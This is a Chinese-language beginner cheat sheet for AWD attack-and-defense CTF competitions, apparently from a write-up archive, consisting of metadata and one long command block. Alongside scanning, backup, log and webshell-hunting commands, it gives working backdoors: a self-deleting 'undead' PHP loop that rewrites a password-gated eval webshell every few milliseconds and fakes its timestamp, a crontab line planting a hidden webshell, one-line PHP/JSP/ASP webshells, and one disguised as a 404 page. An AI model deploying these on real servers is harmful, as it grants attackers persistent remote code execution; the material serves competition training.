---
title: AWD 比赛入门攻略总结
contest: AWD 入门
year: 2022
difficulty: easy
vuln_type: web_unknown
tags:
- nmap扫描
- nmap-sn
- nmap-sV
- nmap-sS
- find配置文件
- 不死马
- PHP webshell
- crontab 5分钟
- mysqldump
- DEDECMS配置
- Wordpress配置
- DiscuzX配置
- PHPCMS配置
- 端口关闭
- find -mmin
attack_chain:
- nmap -sn 192.168.0.0/24 扫存活
- nmap -sV 192.168.0.2 扫服务版本
- nmap -sS -p 80,445 扫常用端口
- find / -name "nginx.conf" 找 nginx
- find /var/www/html -name *.php -mmin -20 看最近修改
- '不死马: ignore_user_abort(true) + set_time_limit(0) + unlink(__FILE__) + while(1) file_put_contents + usleep(5000)'
- 'crontab 5 分钟反弹: echo "* * * * * echo ... shell" | crontab'
- mysqldump -u root -p password databasename > bak.sql
- find / -type d -perm -002 找可写目录
- find /var/www/html -name "*.php" | xargs grep "eval(" 找 webshell
- '配置文件: DiscuzX2 \config\config_global.php + Wordpress \wp-config.php + DEDECMS5.7 \data\common.inc.php'
key_payload: '''nmap -sn/-sV/-sS / find -name *.conf / 不死马 file_put_contents 5000usleep / crontab 5分钟 / mysqldump / -perm -002 / eval( webshell 查找'''
one_liner: AWD 入门攻略 — nmap 扫存活+服务+端口 + find 配置文件 + 不死马 (usleep 5000) + crontab 5分钟反弹 + mysqldump + 找可写目录 + 找现有 webshell。
lesson: AWD 节奏是 1) 找后门 2) 写后门 3) 修后门 4) 拿 flag;不死马通过 usleep + while 循环 file_put_contents 防杀;crontab 5 分钟一轮是常见 scoring 周期;主流 CMS 配置路径要背熟。
quality: medium
full_path: AWD比赛入门攻略总结.full.md
meta_path: AWD比赛入门攻略总结.meta.md
images_removed: true
images_removed_count: 8
schema_version: v3.0.0-P0
summary: AWD 比赛入门攻略总结。AWD 入门攻略 — nmap 扫存活+服务+端口 + find 配置文件 + 不死马 (usleep 5000) + crontab 5分钟反弹 + mysqldump + 找可写目录 + 找现有 webshell。。关键路径：nmap -sn 192.168.0.0/24 扫存活 → nmap -sV 192.168.0.2 扫服务版本 → nmap -sS -...
category: web
subcategory: web_other
tools_used:
- PHP
- nmap
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 8
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/30384.html
reasoning_chain:
- '[触发点] AWD 节奏：1) 找后门 2) 写后门 3) 修后门 4) 拿 flag → 假设：先扫存活再批量打 / [假设] 已知靶场同 C 段先用 nmap 扫存活 / [动作] nmap -sn 192.168.0.0/24 + nmap -sV 192.168.0.2 / [观察] 拿到 C 段存活主机和服务版本 / [下一步] 定位配置文件目录'
- '[触发点] 拿到靶机但不知网站根目录 → 假设：常见 CMS 配置路径固定 / [动作] find / -name ''nginx.conf'' + find /var/www/html -name ''*.php'' -mmin -20 / [观察] 找到 DEDECMS / Wordpress / DiscuzX 配置文件位置 / [下一步] 用已知弱口令/默认口令登录'
- '[触发点] 修后门后还要持续拿分 → 假设：写不死马留后门 / [动作] ignore_user_abort(true) + set_time_limit(0) + unlink(__FILE__) + while(1) file_put_contents usleep(5000) / [观察] 文件删不掉，循环持续写 shell / [下一步] 用 crontab 5 分钟一轮反弹'
- '[触发点] 后门太多互相杀 → 假设：每 5 分钟一轮弹 shell + mysqldump 备份数据库 / [动作] echo ''* * * * * echo shell | crontab'' + mysqldump -u root / [观察] 拿到数据库权限 / [下一步] 持续刷分'
failed_attempts:
- 试图直接拿 root → 失败：AWD 大多是低权限 www，必须走 webshell
- 试图手工拼接 PHP shell → 失败：容易被 D 盾/WebShell 查杀
key_observations:
- AWD 节奏固定为找后门、写后门、修后门、拿 flag 四段式
- 不死马通过 usleep 5000 + while 循环 file_put_contents 防杀
- 主流 CMS 配置文件路径（DEDECMS / Wordpress / DiscuzX / PHPCMS）要背熟
- crontab 5 分钟一轮是常见 scoring 周期
prerequisites:
- Linux 命令行基础（find / grep / crontab）
- nmap 扫描用法（-sn / -sV / -sS）
- PHP 不死马编写
- 常见 CMS 默认配置路径
---
# AWD比赛入门攻略总结

> 原文: https://www.ctfiot.com/30384.html
> ID: 30384


```
ifconfig #Linux
ipconfig #Windows
namp -sn 192.168.0.0/24 #扫描C段主机存活
httpscan.py 192.168.0.0/24 –t 10 #扫描C段主机存活
nmap -sV 192.168.0.2 #扫描主机系统版本
nmap -sS 192.168.0.2 #扫描主机常用端口
nmap -sS -p 80,445 192.168.0.2 #扫描主机部分端口
nmap -sS -p- 192.168.0.2 #扫描主机全部端口
find / -name "nginx.conf" #定位nginx目录
find / -path "*nginx*" -name nginx*conf #定位nginx配置目录
find / -name "httpd.conf" #定位apache目录
find / -path "*apache*" -name apache*conf #定位apache配置目录
find / -name "index.php" #定位网站目录
/var/log/nginx/ #默认Nginx日志目录
/var/log/apache/ #默认Apache日志目录
/var/log/apache2/ #默认Apache日志目录
/usr/local/tomcat/logs #Tomcat日志目录
tail -f xxx.log #实时刷新滚动日志文件
header(php'flag:'.file_get_contents('/tmp/flag'));
<?php
ignore_user_abort(true); #客户机断开依旧执行
set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
unlink(__FILE__); 删除文件本身，以起到隐蔽自身的作用。
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
 file_put_contents($file,$code);
 system('touch -m -d "2018-12-01 09:10:12" .2.php');
 usleep(5000);
}
?>
system('echo "* * * * * echo \"<?php if(md5(\\\\\\\\\$_POST[pass])==\'7b7fdffef464019f7190d0384d5b3838\'){@eval(\\\\\\\\\$_POST[1]);} \" > /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami');
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
mv web.tar /tmp
mv web.zip /home/xxx
scp username@servername:/path/filename /tmp/local_destination #从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path #从本地上传单个文件到服务器
scp -r username@servername:
remote_dir/ /tmp/local_dir #从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:
remote_dir #从本地上传整个目录到服务器
Xshell、SecureCRT、finalshell
FileZilla 、WinSCP、SmartFTP
mysqldump –u username –p password databasename > bak.sql
mysqldump –all -databases > bak.sql
mysql –u username –p password database < bak.sql
netstat -ano/-a #查看端口情况
uname -a #系统信息
ps -aux、ps -ef #进程信息
cat /etc/passwd #用户情况
ls /home/ #用户情况
id #用于显示用户ID，以及所属群组ID
find / -type d -perm -002 #可写目录检查
grep -r “flag” /var/www/html/ #查找默认FLAG
passwd username #ssh口令修改
set password for mycms@localhost = password('123'); #MySQL密码修改
find /var/www//html -path '*config*’ #查找配置文件中的密码凭证
find /var/www/html/ -name "*.tar"
find /var/www/html/ -name "*.zip"
find /var/www/html -name *.php -mmin -20 #查看最近20分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u #寻找行数最短文件
grep -r --include=*.php '[^a-z]eval($_POST' /var/www/html #查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more
# phpwebshell
<?php @eval($_GET['cmd']); ?>

<?php @eval($_POST['cmd']); ?>

<?php @eval($_REQUESTS['cmd']); ?>
# jspwebshell

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
# aspwebshell

<%eval request ("cmd")%> 或 <% execute(request("cmd")) %>
<?php

system("kill -9 pid;rm -rf .shell.php"); #pid和不死马名称根据实际情况定

?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">

<html><head>

<title>404 Not Found</title>

</head>

<h1>Not Found</h1>

The requested URL was not found on this server.

</html>

<?php @preg_replace("/[pageerror]/e",$_POST['error'],"saft"); header('HTTP/1.1 404 Not Found');

?>
ps -aux #查看进程
kill -9 pid #强制进程查杀
netstat -anp #查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent #关闭端口
firewall-cmd –reload #重载防火墙
DiscuzX2 \config\config_global.php

Wordpress \wp-config.php

Metinfo \include\head.php

PHPCMS V9 \phpcms\base.php

PHPWIND8.7 \data\sql_config.php

DEDECMS5.7 \data\common.inc.php
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]